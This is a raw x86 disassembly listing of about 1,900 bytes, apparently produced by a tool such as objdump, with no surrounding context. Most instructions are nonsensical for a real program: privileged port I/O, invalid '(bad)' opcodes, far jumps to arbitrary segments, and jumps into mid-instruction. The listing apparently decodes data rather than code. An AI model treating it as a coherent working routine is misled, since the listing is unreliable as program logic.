  4085d7:	or     bl,BYTE PTR [ebp+ecx*8+0x14068bad]
  4085de:	ds in  eax,dx
  4085e0:	push   esi
  4085e1:	cmp    ebp,edx
  4085e3:	mov    ebx,0xc2c104b4
  4085e8:	gs mov dl,0x5a
  4085eb:	xchg   ecx,eax
  4085ec:	pop    edx
  4085ee:	retf   0x52c8
  4085f1:	test   eax,0x5f4a467e
  4085f6:	popf   
  4085f7:	rcr    BYTE PTR [eax-0x3a],cl
  4085fa:	pop    es
  4085fb:	mov    ebx,0x6785f77c
  408600:	nop
  408601:	retw   0xd7a0
  408605:	es iret 
  408607:	jae    0x4085ef
  408609:	repz pop ecx
  40860b:	in     eax,0xb4
  40860d:	mov    ch,0xd6
  40860f:	xchg   edx,eax
  408610:	mov    dh,BYTE PTR es:[ebx-0x3a1bb959]
  408617:	add    DWORD PTR [edi],ebp
  408619:	cmp    al,0xf7
  40861b:	gs push ds
  40861d:	js     0x408603
  40861f:	sub    DWORD PTR [esi],ebx
  408621:	jle    0x408617
  408623:	mov    DWORD PTR ds:0xb912e327,esp
  408629:	push   0xe355a86c
  40862e:	pop    ebp
  40862f:	pushf  
  408630:	cdq    
  408631:	stos   DWORD PTR es:[edi],eax
  408632:	fadd   st(1),st
  408634:	or     DWORD PTR ds:0x1c183089,esp
  40863a:	mov    bl,0x3a
  40863c:	sub    ch,BYTE PTR [ebp+0x78]
  40863f:	xchg   ebp,eax
  408640:	or     eax,esp
  408642:	in     eax,0xad
  408644:	mov    ds:0x797c7aaf,eax
  408649:	aaa    
  40864a:	inc    edi
  40864b:	lods   eax,DWORD PTR ds:[esi]
  40864c:	cld    
  40864d:	mov    ecx,0x524c6b10
  408652:	xchg   esp,eax
  408653:	in     eax,0x96
  408655:	push   esp
  408656:	stos   BYTE PTR es:[edi],al
  408657:	div    BYTE PTR [edx]
  408659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40865a:	xchg   esp,eax
  40865b:	pop    eax
  40865c:	sub    al,0xb7
  40865e:	outs   dx,BYTE PTR ds:[esi]
  40865f:	in     eax,0xe8
  408661:	mov    ds:0xae578361,al
  408666:	jecxz  0x4086e0
  408668:	push   0x34269130
  40866d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40866e:	rcl    DWORD PTR [ebx],1
  408670:	pop    ebx
  408671:	sbb    bl,BYTE PTR [edx+0x73]
  408674:	scas   eax,DWORD PTR es:[edi]
  408675:	pop    ebp
  408676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408677:	pop    ebp
  408678:	pop    esp
  408679:	jnp    0x408660
  40867b:	xor    DWORD PTR [ebx],ebp
  40867d:	jp     0x40867a
  40867f:	cmp    ebx,esi
  408681:	xlat   BYTE PTR ds:[ebx]
  408682:	mov    ds:0x4ab6b5ac,al
  408687:	mov    cl,0xcd
  408689:	jb     0x40869a
  40868b:	add    BYTE PTR [ecx+0x6646b25],bl
  408691:	cs test esi,esp
  408694:	loop   0x4086f1
  408696:	mov    cl,BYTE PTR [edi+0x69]
  408699:	pop    ss
  40869a:	sti    
  40869b:	loop   0x4086d8
  40869d:	scas   al,BYTE PTR es:[edi]
  40869e:	into   
  40869f:	popa   
  4086a0:	mov    ds:0xfe32aacf,al
  4086a5:	sti    
  4086a6:	(bad)  
  4086a7:	jmp    0x408700
  4086a9:	clc    
  4086aa:	into   
  4086ab:	mov    bh,0xfe
  4086ad:	cwde   
  4086ae:	jle    0x4086f7
  4086b0:	shr    ebp,cl
  4086b2:	mov    dh,0xc9
  4086b4:	xor    dh,BYTE PTR [edi]
  4086b6:	dec    ebx
  4086b7:	push   edi
  4086b8:	enter  0x8bb0,0x29
  4086bc:	imul   BYTE PTR [esi+esi*1+0x23]
  4086c0:	push   ecx
  4086c1:	xchg   edx,eax
  4086c2:	in     eax,dx
  4086c3:	push   ecx
  4086c4:	xchg   edi,edx
  4086c6:	mov    edi,0x7ccf1cff
  4086cb:	cmc    
  4086cc:	dec    ebx
  4086cd:	xchg   esp,eax
  4086ce:	gs jo  0x4086b4
  4086d1:	push   ebx
  4086d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d3:	daa    
  4086d4:	scas   eax,DWORD PTR es:[edi]
  4086d5:	mov    edx,0xd5a55c5e
  4086da:	xlat   BYTE PTR ds:[ebx]
  4086db:	(bad)  
  4086dc:	jae    0x40868b
  4086de:	jp     0x4086a4
  4086e0:	fidiv  DWORD PTR [ecx]
  4086e2:	push   es
  4086e3:	adc    al,0x33
  4086e5:	inc    esi
  4086e6:	ret    
  4086e7:	mov    DWORD PTR ds:[edx-0x56],ecx
  4086eb:	inc    ecx
  4086ec:	inc    ebx
  4086ed:	inc    eax
  4086ee:	in     eax,dx
  4086ef:	jnp    0x408689
  4086f1:	inc    esi
  4086f2:	in     eax,dx
  4086f3:	mov    BYTE PTR [ecx-0xf106877],dl
  4086f9:	mov    dl,0x8e
  4086fb:	sub    eax,0x8bb8006b
  408700:	and    al,0x69
  408702:	jp     0x408746
  408704:	or     dh,BYTE PTR [ecx]
  408706:	mov    bl,BYTE PTR ds:0x427d649
  40870c:	popa   
  40870d:	sub    eax,0xb05a6fd7
  408712:	sub    eax,0x8e5f4316
  408717:	sub    esp,DWORD PTR [esi]
  408719:	fcom   DWORD PTR [ebx]
  40871b:	loope  0x408709
  40871d:	sub    ecx,edx
  40871f:	lods   al,BYTE PTR ds:[esi]
  408720:	jmp    0xbb44:0xc60089b5
  408727:	mov    ss,WORD PTR [eax-0xe]
  40872a:	push   0x5b
  40872c:	adc    ebp,DWORD PTR [eax+0x7ef11122]
  408732:	adc    edx,DWORD PTR ds:0x302395b3
  408738:	iret   
  408739:	or     eax,0x9932ccd3
  40873e:	pop    ecx
  40873f:	fimul  WORD PTR es:[edi]
  408742:	nop
  408743:	out    0x51,eax
  408745:	push   edx
  408746:	nop
  408747:	push   edi
  408748:	mov    al,ds:0xcdfe3955
  40874d:	cwde   
  40874e:	jnp    0x40879d
  408750:	loope  0x4086e1
  408752:	fimul  DWORD PTR [edi+0x74]
  408755:	mov    esi,0xc0d6fce8
  40875a:	cmc    
  40875b:	stos   DWORD PTR es:[edi],eax
  40875c:	xchg   edi,eax
  40875d:	js     0x408754
  40875f:	jnp    0x4087e0
  408761:	retf   0xe7b0
  408764:	es es int 0xf3
  408768:	jl     0x408773
  40876a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40876b:	fwait
  40876c:	lahf   
  40876d:	cmp    al,0xcf
  40876f:	leave  
  408770:	mov    dl,0x8c
  408772:	xchg   DWORD PTR [edi],ebx
  408774:	cmp    al,0x7
  408776:	in     eax,0x1e
  408778:	iret   
  408779:	xrelease xchg DWORD PTR ds:0xebf8b6d5,edx
  408781:	push   eax
  408782:	mov    edi,0x68504ad6
  408787:	fcomp  QWORD PTR [edi+0xd]
  40878a:	scas   al,BYTE PTR es:[edi]
  40878b:	std    
  40878c:	mov    ?,WORD PTR [eax]
  40878e:	shr    DWORD PTR [eax],0x8c
  408791:	pusha  
  408792:	adc    al,0x66
  408794:	(bad)  
  408795:	jo     0x40873a
  408797:	xchg   DWORD PTR [edx+ebp*4+0x31f0f252],edx
  40879e:	(bad)  
  40879f:	push   esp
  4087a0:	test   eax,0xf98961bf
  4087a5:	push   es
  4087a6:	add    ebp,DWORD PTR [eax]
  4087a8:	mov    ecx,0x1ac026cf
  4087ad:	add    dh,ch
  4087af:	cs dec edi
  4087b1:	dec    eax
  4087b2:	sub    DWORD PTR [ebx+0x15],edi
  4087b5:	add    BYTE PTR [eax+0x37],bl
  4087b8:	cmp    BYTE PTR [esi],dl
  4087ba:	jmp    0xefaf8871
  4087bf:	imul   edx,DWORD PTR [eax],0x94094a09
  4087c5:	adc    cl,BYTE PTR [eax-0x54f1ea36]
  4087cb:	jnp    0x4087b1
  4087cd:	cmp    esi,ebp
  4087cf:	call   0xaeea2735
  4087d4:	mov    ch,0xd8
  4087d6:	push   ds
  4087d7:	call   FWORD PTR [esi-0x4b]
  4087da:	lods   eax,DWORD PTR ds:[esi]
  4087db:	shl    DWORD PTR [esi],0x56
  4087de:	pop    ebp
  4087df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087e0:	push   esi
  4087e1:	mov    dh,0x79
  4087e3:	scas   al,BYTE PTR es:[edi]
  4087e4:	or     BYTE PTR [edx+ebx*4-0x23],cl
  4087e8:	mov    eax,0xb18d86ef
  4087ed:	xchg   esp,eax
  4087ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087ef:	and    eax,0x39b30ccf
  4087f4:	dec    esp
  4087f5:	addr16 out dx,al
  4087f7:	jg     0x4087df
  4087f9:	ret    
  4087fa:	xor    DWORD PTR [ecx-0x2],0xfd594d7d
  408801:	sub    DWORD PTR [edx+0x3eabfbb9],ebx
  408807:	inc    edi
  408808:	add    al,BYTE PTR [edx+0x54]
  40880b:	and    eax,0xedeec2d6
  408810:	sbb    edi,DWORD PTR [ebp+esi*8-0xb930c26]
  408817:	pop    esp
  408818:	cli    
  408819:	ins    BYTE PTR es:[edi],dx
  40881a:	pop    ecx
  40881b:	xchg   esi,eax
  40881c:	sub    edx,DWORD PTR ds:0xd909f9be
  408822:	ja     0x4087ab
  408824:	xchg   DWORD PTR [ebx-0x32],esp
  408827:	pushf  
  408828:	fisub  DWORD PTR [ecx]
  40882a:	fsubrp st(2),st
  40882d:	cmp    ebx,edi
  40882f:	stc    
  408830:	xor    esi,DWORD PTR [edx-0x53]
  408833:	jmp    0x4087b5
  408835:	adc    al,0x7d
  408837:	pop    edi
  408838:	jne    0x408899
  40883a:	jno    0x408869
  40883c:	push   esi
  40883d:	and    BYTE PTR ds:0x59ed5d55,dl
  408843:	and    eax,DWORD PTR [eax]
  408845:	mov    al,0x3a
  408847:	pop    edi
  408848:	jmp    0x9f3ef842
  40884d:	iret   
  40884e:	out    0xb5,eax
  408850:	mov    DWORD PTR [ebp+edi*4-0x34],edx
  408854:	xor    bl,0xcd
  408857:	(bad)  
  408858:	out    dx,eax
  408859:	inc    esp
  40885a:	(bad)  
  40885b:	add    BYTE PTR [eax+0x17],dh
  40885e:	sub    ebx,ecx
  408860:	repnz popa 
  408862:	inc    eax
  408863:	sub    bh,ch
  408865:	add    BYTE PTR [edi+ebp*4],cl
  408868:	dec    edx
  408869:	mov    ecx,0x270e0ca4
  40886e:	sbb    dl,BYTE PTR [edx]
  408870:	inc    ecx
  408871:	mov    ds:0x9244ed24,al
  408876:	es push 0xffffffd9
  408879:	push   cs
  40887a:	mov    esi,0xf8fcc493
  40887f:	mov    ss,WORD PTR [esp+edi*4-0x47]
  408883:	dec    DWORD PTR [esi+0x65]
  408886:	sbb    esp,DWORD PTR [eax-0x510c5890]
  40888c:	xor    al,BYTE PTR [ebx]
  40888e:	mov    gs,WORD PTR [eax]
  408890:	outs   dx,DWORD PTR ds:[esi]
  408891:	jno    0x408896
  408893:	xor    edx,0x12
  408896:	mov    dl,0xdc
  408898:	inc    esi
  408899:	loope  0x4088db
  40889b:	xchg   edi,eax
  40889c:	adc    eax,0x720a1ba8
  4088a1:	push   esp
  4088a2:	(bad)  
  4088a3:	pop    edi
  4088a4:	frstor [edx-0x2c]
  4088a7:	mov    ebx,0x2af5e936
  4088ac:	jae    0x4088d0
  4088ae:	sub    bl,ah
  4088b0:	clc    
  4088b1:	lock xor BYTE PTR [edi],0x5e
  4088b5:	stc    
  4088b6:	xor    ebx,DWORD PTR [edx+0x2a]
  4088b9:	scas   eax,DWORD PTR es:[edi]
  4088ba:	sub    DWORD PTR [edi+0x18],edi
  4088bd:	data16 jmp 0x408896
  4088c0:	cmp    BYTE PTR [eax-0x6b],dl
  4088c3:	shl    BYTE PTR [edi],cl
  4088c5:	inc    ebx
  4088c6:	imul   eax,ecx,0x39e796e1
  4088cc:	addr16 dec edi
  4088ce:	outs   dx,DWORD PTR ds:[esi]
  4088cf:	jae    0x4088b2
  4088d1:	int    0x97
  4088d3:	fnstcw WORD PTR [ebx+0x3b096b7d]
  4088d9:	arpl   ax,bp
  4088db:	scas   al,BYTE PTR es:[edi]
  4088dc:	sub    DWORD PTR [ebx],edi
  4088de:	mov    ecx,DWORD PTR [eax+ecx*8]
  4088e1:	and    eax,0x2009a553
  4088e6:	shl    DWORD PTR [eax],1
  4088e8:	and    al,0x17
  4088ea:	sub    DWORD PTR [ecx],esi
  4088ec:	mov    ah,0x5b
  4088ee:	sub    DWORD PTR [ebp+0x59],esp
  4088f1:	(bad)  
  4088f2:	sub    BYTE PTR [edi+0x73],bh
  4088f5:	scas   al,BYTE PTR es:[edi]
  4088f6:	ret    
  4088f7:	mov    ds:0x4c9628,al
  4088fc:	and    esp,eax
  4088fe:	jne    0x40893f
  408900:	scas   eax,DWORD PTR es:[edi]
  408901:	loopne 0x408980
  408903:	xchg   ebx,eax
  408904:	mov    ch,0x13
  408906:	lock mov cs:0x34387a94,al
  40890d:	and    al,0x5b
  40890f:	(bad)  
  408911:	int    0x5b
  408913:	mov    ebx,0x54681c1c
  408918:	mov    ds:0xad0476e8,al
  40891d:	dec    esi
  40891e:	inc    edx
  40891f:	pop    ecx
  408920:	ret    0x666c
  408923:	enter  0xeb0a,0xd7
  408927:	in     eax,dx
  408928:	mov    ah,0x54
  40892a:	ss mov esi,0x34494df5
  408930:	repz in ax,dx
  408933:	jb     0x4088f1
  408935:	retf   
  408936:	fiadd  DWORD PTR [ebp+0x5e2f7069]
  40893c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40893d:	sub    ah,BYTE PTR [edi-0x3a319120]
  408943:	cmp    esp,ebp
  408945:	in     eax,dx
  408946:	inc    esi
  408947:	jecxz  0x408959
  408949:	ret    0x457d
  40894c:	fidivr WORD PTR [eax]
  40894e:	imul   eax,DWORD PTR [eiz*2+0x5a047789],0xffffffa6
  408956:	jae    0x408982
  408958:	push   es
  408959:	nop
  40895a:	jnp    0x4089a3
  40895c:	mov    al,ds:0xe24efe12
  408961:	leave  
  408962:	mov    DWORD PTR [edx],ebx
  408964:	push   edi
  408965:	stos   BYTE PTR es:[edi],al
  408966:	mov    ch,0xeb
  408968:	adc    BYTE PTR [edi+0x3f],bh
  40896b:	ret    0x1819
  40896e:	bound  ebx,QWORD PTR [ecx+eax*2]
  408971:	out    0xb3,al
  408973:	or     edi,ebx
  408975:	jge    0x408975
  408977:	stos   DWORD PTR es:[edi],eax
  408978:	hlt    
  408979:	sar    BYTE PTR [ecx+esi*1+0x29],cl
  40897d:	mov    edi,DWORD PTR [edi+0x3f]
  408980:	aad    0x31
  408982:	lea    esi,[eax+0x82cd35a]
  408988:	fild   DWORD PTR [ecx]
  40898a:	mov    edx,0xc3d30e9d
  40898f:	jge    0x40893f
  408991:	pop    edi
  408992:	mov    ebx,0x45b868ca
  408997:	xchg   edx,eax
  408998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408999:	cmc    
  40899a:	xlat   BYTE PTR ds:[ebx]
  40899b:	sar    BYTE PTR [edi+ebp*2-0x178e6081],cl
  4089a2:	xor    BYTE PTR [esi+0x46],bh
  4089a5:	dec    ebx
  4089a6:	mov    ebp,0x39e78fe7
  4089ab:	sub    BYTE PTR [ebp+0x461893a5],dh
  4089b1:	mov    ds:0x5be4e551,eax
  4089b6:	jp     0x408a16
  4089b8:	lahf   
  4089b9:	adc    BYTE PTR [ebp+eiz*2-0x7fe35527],dl
  4089c0:	or     eax,eax
  4089c2:	jge    0x408961
  4089c4:	cmp    al,0x74
  4089c6:	or     eax,0xb5884700
  4089cb:	div    BYTE PTR [ecx+ebx*2-0x6a]
  4089cf:	lahf   
  4089d0:	js     0x4089d0
  4089d2:	pop    ebx
  4089d3:	(bad)  
  4089d5:	fwait
  4089d6:	sti    
  4089d7:	jnp    0x408a54
  4089d9:	outs   dx,BYTE PTR ds:[esi]
  4089da:	sbb    eax,0x90422080
  4089df:	test   al,0x84
  4089e1:	sbb    edx,edi
  4089e3:	outs   dx,DWORD PTR ds:[esi]
  4089e4:	mov    cl,0xb7
  4089e6:	scas   eax,DWORD PTR es:[edi]
  4089e7:	dec    ecx
  4089e8:	xchg   ebp,eax
  4089e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ea:	fisttp WORD PTR [edi-0x28]
  4089ed:	fsubr  QWORD PTR [ebx+edx*2+0x6a]
  4089f1:	mov    eax,0xc6605bbd
  4089f6:	add    eax,0x19434e59
  4089fb:	(bad)  
  4089fc:	push   edx
  4089fd:	loop   0x4089a7
  4089ff:	retf   
  408a00:	ins    BYTE PTR es:[edi],dx
  408a01:	jp     0x4089ed
  408a03:	sub    eax,0x8af736de
  408a08:	imul   eax,DWORD PTR [ebx-0x15],0xffffffb3
  408a0c:	lods   al,BYTE PTR ds:[esi]
  408a0d:	aam    0x98
  408a0f:	shl    BYTE PTR [ebp-0x3b],1
  408a12:	cmp    DWORD PTR [edi+0x2c],0x51
  408a16:	mov    esi,DWORD PTR [ebp-0x323a09d5]
  408a1c:	mov    bh,0xc1
  408a1e:	or     BYTE PTR [edx+0x4583751c],ch
  408a24:	mov    eax,0x7585f431
  408a29:	jle    0x4089ab
  408a2b:	test   eax,0x4c133261
  408a30:	xor    ecx,eax
  408a32:	jae    0x408a15
  408a34:	xor    ah,al
  408a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a37:	pop    es
  408a38:	sbb    eax,0xe7638922
  408a3e:	int    0xf4
  408a40:	xor    DWORD PTR [eax+0x45],0xffffffbb
  408a44:	jp     0x408ac5
  408a46:	cld    
  408a47:	mov    BYTE PTR [ebp-0x67],ah
  408a4a:	repz retf 0xcf4b
  408a4e:	and    ebp,ecx
  408a50:	cwde   
  408a51:	dec    esi
  408a52:	xor    DWORD PTR [bp+si+0x572c],0x29
  408a58:	dec    ecx
  408a59:	lods   eax,DWORD PTR ds:[esi]
  408a5a:	xchg   edi,eax
  408a5b:	pop    DWORD PTR [ecx]
  408a5d:	mov    al,ds:0x924f4b39
  408a62:	and    al,0x2e
  408a64:	out    0xbe,eax
  408a66:	sub    BYTE PTR [eax-0x18b3d8b4],bl
  408a6c:	jae    0x408a68
  408a6e:	sub    dh,BYTE PTR [ecx-0x11]
  408a71:	mov    edx,0x57cde0a1
  408a76:	mov    eax,0x3162b184
  408a7b:	fsubr  DWORD PTR [eax]
  408a7d:	test   BYTE PTR [ecx+0x6e83d184],0x7e
  408a84:	inc    esp
  408a85:	adc    DWORD PTR [edx+0x5],0xffffffad
  408a89:	push   esi
  408a8a:	stos   DWORD PTR es:[edi],eax
  408a8b:	retf   0x5801
  408a8e:	xchg   ebp,eax
  408a8f:	in     al,dx
  408a90:	push   ebx
  408a91:	adc    al,0x5
  408a93:	jnp    0x408b10
  408a95:	jnp    0x408ae2
  408a97:	pusha  
  408a98:	add    eax,0xbf9bfabc
  408a9d:	stc    
  408a9e:	fwait
  408a9f:	dec    ebx
  408aa0:	jbe    0x408a63
  408aa2:	cmp    edx,DWORD PTR [ecx-0x5dbbffcb]
  408aa8:	retf   
  408aa9:	repnz sub al,0xf0
  408aac:	repz push ss
  408aae:	(bad)  
  408aaf:	stos   BYTE PTR es:[edi],al
  408ab0:	sar    edx,1
  408ab2:	scas   eax,DWORD PTR es:[edi]
  408ab3:	imul   ebp,DWORD PTR [ebp+0x1f2d5a77],0xffffffe2
  408aba:	mov    edx,DWORD PTR [eax+ecx*2]
  408abd:	clc    
  408abe:	or     al,al
  408ac0:	lea    ebx,[ebx+0x454ac9b7]
  408ac6:	call   0xb0e1:0x84edda0a
  408acd:	or     eax,0xb2028a08
  408ad2:	mov    ecx,0xcbb42f26
  408ad7:	adc    BYTE PTR [ecx+esi*2-0x7cb4f051],dh
  408ade:	outs   dx,BYTE PTR ds:[esi]
  408adf:	push   0x12
  408ae1:	shl    edi,cl
  408ae3:	mov    ebx,0xb837ed8d
  408ae8:	test   DWORD PTR [edx-0x78],eax
  408aeb:	inc    eax
  408aec:	mov    eax,ds:0x26c2a19
  408af1:	inc    edi
  408af2:	jl     0x408a81
  408af4:	mov    eax,0xdd75b35
  408af9:	push   edi
  408afa:	inc    ebp
  408afb:	xchg   esi,eax
  408afc:	cdq    
  408afd:	dec    edx
  408afe:	mov    BYTE PTR [eax+ebp*8],al
  408b01:	shl    BYTE PTR [ebp-0x3e5e78fb],cl
  408b07:	pop    ecx
  408b08:	out    dx,al
  408b09:	sahf   
  408b0a:	mov    ecx,0x2dee2ed4
  408b0f:	inc    esp
  408b10:	cmp    eax,0x9e53581c
  408b15:	jo     0x408add
  408b17:	inc    esi
  408b18:	cwde   
  408b19:	out    dx,eax
  408b1a:	outs   dx,BYTE PTR ds:[esi]
  408b1b:	mov    ds:0xaf1bc975,al
  408b20:	cmp    al,0x4f
  408b22:	bound  ecx,QWORD PTR [edi]
  408b24:	sbb    DWORD PTR [esi+ecx*1+0x29],ebp
  408b28:	mov    al,dl
  408b2a:	aas    
  408b2b:	mov    dh,0xa8
  408b2d:	jge    0x408b11
  408b2f:	ins    DWORD PTR es:[edi],dx
  408b30:	int    0xef
  408b32:	mov    eax,ds:0xc1660dc7
  408b37:	pusha  
  408b38:	xor    al,ah
  408b3a:	xchg   ebp,eax
  408b3b:	push   edi
  408b3c:	ffreep st(0)
  408b3e:	fadd   DWORD PTR [esp+eax*2+0x4d9dd9b9]
  408b45:	push   eax
  408b46:	enter  0x7dc6,0xad
  408b4a:	retf   0x8841
  408b4d:	stos   DWORD PTR es:[edi],eax
  408b4e:	or     edx,DWORD PTR [ebx]
  408b50:	jns    0x408bb3
  408b52:	cmp    al,0xf5
  408b54:	scas   eax,DWORD PTR es:[edi]
  408b55:	out    0x1b,al
  408b57:	lock ret 
  408b59:	xchg   DWORD PTR [ebp+0x56554836],ecx
  408b5f:	push   cs
  408b60:	mov    edi,0x3eb6dcea
  408b65:	inc    edi
  408b66:	mov    al,ds:0x2e1c51f3
  408b6b:	mov    cl,0x17
  408b6d:	loopne 0x408b41
  408b6f:	mov    ebp,0xcbbdd6d5
  408b74:	jg     0x408b47
  408b76:	add    BYTE PTR [eax+0x16],dl
  408b79:	inc    ebp
  408b7a:	pop    es
  408b7b:	cmp    BYTE PTR [ecx],ch
  408b7d:	test   al,bh
  408b7f:	xchg   esp,eax
  408b80:	mov    ch,0xf6
  408b82:	outs   dx,DWORD PTR ds:[esi]
  408b83:	sbb    ah,BYTE PTR [ebx+0x3e]
  408b86:	lods   al,BYTE PTR gs:[esi]
  408b88:	sbb    eax,0xb3d54f59
  408b8d:	sub    al,0x27
  408b8f:	iret   
  408b90:	repz fisub DWORD PTR [eax]
  408b93:	and    BYTE PTR [ebx],cl
  408b95:	dec    eax
  408b96:	dec    edi
  408b97:	shr    DWORD PTR [esi-0x23],cl
  408b9a:	fcmovb st,st(5)
  408b9c:	rol    BYTE PTR [esi+0x29],cl
  408b9f:	inc    ecx
  408ba0:	stos   DWORD PTR es:[edi],eax
  408ba1:	and    eax,0x5413f419
  408ba6:	mov    ds:0xe335cd98,al
  408bab:	jno    0x408b6e
  408bad:	fs scas al,BYTE PTR es:[edi]
  408baf:	shl    esi,1
  408bb1:	outs   dx,BYTE PTR ds:[esi]
  408bb2:	aam    0x3d
  408bb4:	ds jae 0x408b6a
  408bb7:	imul   esi,ecx,0x4a
  408bba:	pop    ebx
  408bbb:	sub    DWORD PTR [ebx+0x0],esp
  408bbe:	test   DWORD PTR ds:0x3cedddc7,edx
  408bc4:	dec    ebx
  408bc5:	mov    ?,WORD PTR gs:[eax]
  408bc8:	lods   al,BYTE PTR cs:[esi]
  408bca:	adc    eax,0x82809b60
  408bcf:	xor    eax,DWORD PTR [ebx]
  408bd1:	lods   al,BYTE PTR ds:[esi]
  408bd2:	inc    ecx
  408bd3:	imul   ecx,DWORD PTR [ecx+0x51],0xffffffba
  408bd7:	jno    0x408bda
  408bd9:	and    DWORD PTR [eax+ebx*4],edx
  408bdc:	jnp    0x408bde
  408bde:	dec    eax
  408bdf:	xchg   ebx,eax
  408be0:	test   DWORD PTR ds:0xd363384c,ebx
  408be6:	(bad)  
  408be8:	push   0x29aa5b58
  408bed:	mov    edi,0x7fefd5e1
  408bf2:	mov    edi,DWORD PTR [edx+esi*2-0x6f]
  408bf6:	int    0x61
  408bf8:	scas   eax,DWORD PTR es:[edi]
  408bf9:	(bad)  
  408bfa:	repz fisttp WORD PTR [ebp-0x17]
  408bfe:	jecxz  0x408be9
  408c00:	mov    bh,0x42
  408c02:	(bad)
  408c06:	fucomi st,st(5)
  408c08:	mov    dl,0xbf
  408c0a:	mov    edi,0xbdaf2bcf
  408c0f:	lds    ebp,FWORD PTR [eax-0x19]
  408c12:	and    DWORD PTR [edx],edi
  408c14:	fnstsw WORD PTR [esi]
  408c16:	push   edx
  408c17:	sub    al,BYTE PTR [edx+eiz*4]
  408c1a:	call   0xee7:0xab34407f
  408c21:	bound  esp,QWORD PTR [ebx]
  408c23:	jo     0x408c30
  408c25:	aam    0x3f
  408c27:	xor    BYTE PTR [ecx],al
  408c29:	ins    DWORD PTR es:[edi],dx
  408c2a:	cmp    eax,0xd19a9408
  408c2f:	mov    DWORD PTR [ecx],eax
  408c31:	push   edx
  408c32:	sub    DWORD PTR [edi+eax*1-0x7f66aa50],ecx
  408c39:	pop    edx
  408c3a:	jmp    0x408be1
  408c3c:	cdq    
  408c3d:	test   BYTE PTR [ebp-0x621ffe54],bh
  408c43:	dec    eax
  408c44:	xchg   esi,eax
  408c45:	gs daa 
  408c47:	add    eax,0xbf820cfc
  408c4c:	add    dl,ah
  408c4e:	jno    0x408cbd
  408c50:	hlt    
  408c51:	pop    es
  408c52:	lods   al,BYTE PTR ds:[esi]
  408c53:	mov    ch,0xf
  408c55:	pop    ebx
  408c56:	imul   eax,DWORD PTR [edi],0xffffffd6
  408c59:	pop    edx
  408c5a:	xchg   edi,eax
  408c5b:	cdq    
  408c5c:	(bad)
  408c5f:	xor    ebx,DWORD PTR [ebx+0x24c5814e]
  408c65:	and    ch,dl
  408c67:	dec    ebx
  408c68:	xchg   edx,eax
  408c69:	adc    ah,BYTE PTR [ebx+0x34]
  408c6c:	out    0xdf,eax
  408c6e:	mov    edx,0x920fb581
  408c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c74:	shr    BYTE PTR [ecx-0x5],1
  408c77:	pop    ecx
  408c78:	pusha  
  408c79:	cli    
  408c7a:	sub    eax,0x3e32d2ca
  408c7f:	sub    al,0x19
  408c81:	dec    edi
  408c82:	dec    edx
  408c83:	mov    ah,0x6e
  408c85:	div    BYTE PTR [esi+0x8f82521]
  408c8b:	pusha  
  408c8c:	mov    al,0x96
  408c8e:	push   0x66
  408c90:	lahf   
  408c91:	and    eax,0xf1255e25
  408c96:	stc    
  408c97:	fwait
  408c98:	out    0x8c,eax
  408c9a:	push   es
  408c9b:	push   es
  408c9c:	sub    eax,0x7de37bf9
  408ca1:	dec    ebp
  408ca2:	push   eax
  408ca3:	icebp  
  408ca4:	fisttp DWORD PTR [ebp+ebp*4+0x142eb2ef]
  408cab:	pop    eax
  408cac:	push   0x4b
  408cae:	xchg   esi,eax
  408caf:	sbb    DWORD PTR [esi+0x73],esp
  408cb2:	shl    ecx,0xcc
  408cb5:	test   DWORD PTR [edi+eiz*8],eax
  408cb8:	mov    ecx,0x2690171b
  408cbd:	cs (bad) 
  408cbf:	fisub  WORD PTR [ecx]
  408cc1:	gs jecxz 0x408cfa
  408cc4:	std    
  408cc5:	lods   eax,DWORD PTR ds:[esi]
  408cc6:	sbb    eax,0x1478705
  408ccb:	ret    
  408ccc:	aad    0x8b
  408cce:	scas   eax,DWORD PTR es:[edi]
  408ccf:	xor    DWORD PTR [esi+0x4f6706fd],edi
  408cd5:	outs   dx,DWORD PTR ds:[esi]
  408cd6:	push   esi
  408cd7:	cmp    eax,0x3be5007f
  408cdc:	sub    edx,edi
  408cde:	stos   BYTE PTR es:[edi],al
  408cdf:	std    
  408ce0:	outs   dx,BYTE PTR ds:[esi]
  408ce1:	repnz iret 
  408ce3:	push   cs
  408ce4:	repz jns 0x408cad
  408ce7:	xlat   BYTE PTR ds:[ebx]
  408ce8:	lahf   
  408ce9:	jge    0x408cec
  408ceb:	stos   DWORD PTR es:[edi],eax
  408cec:	cli    
  408ced:	pushf  
  408cee:	cmp    BYTE PTR [ecx-0x6a],bh
  408cf1:	(bad)  
  408cf2:	pusha  
  408cf3:	dec    eax
  408cf4:	(bad)  
  408cf6:	pusha  
  408cf7:	lods   eax,DWORD PTR ds:[esi]
  408cf8:	test   al,0xc8
  408cfa:	rcr    BYTE PTR [ebp-0x569f49f4],cl
  408d00:	pop    ecx
  408d01:	jg     0x408ce6
  408d03:	ror    DWORD PTR [ecx+ecx*4-0x49a8017],0x17
  408d0b:	into   
  408d0c:	inc    edi
  408d0d:	bound  esi,QWORD PTR [ebp-0x3a]
  408d10:	out    0xb0,al
  408d12:	(bad)  
  408d13:	hlt    
  408d14:	or     ebp,DWORD PTR [esi+0x278efd06]
  408d1a:	or     BYTE PTR [ebp+0x1335652],dl
  408d20:	xor    eax,0x16e0c000
  408d25:	cmp    al,0xbd
  408d27:	scas   eax,DWORD PTR es:[edi]
  408d28:	repnz out 0x1e,eax
  408d2b:	add    BYTE PTR [edx-0x3f4c4d4],dh
  408d31:	cmp    al,0xf0
  408d33:	repz (bad) 
  408d35:	fidivr DWORD PTR [edi-0x2f86539f]
  408d3b:	cli    
  408d3c:	sahf   
  408d3d:	int3   
  408d3e:	cli    
  408d3f:	scas   al,BYTE PTR es:[edi]
  408d40:	retf   0xfff8
  408d43:	outs   dx,BYTE PTR ds:[esi]
  408d44:	jnp    0x408cf6
  408d46:	adc    eax,0x84c99305
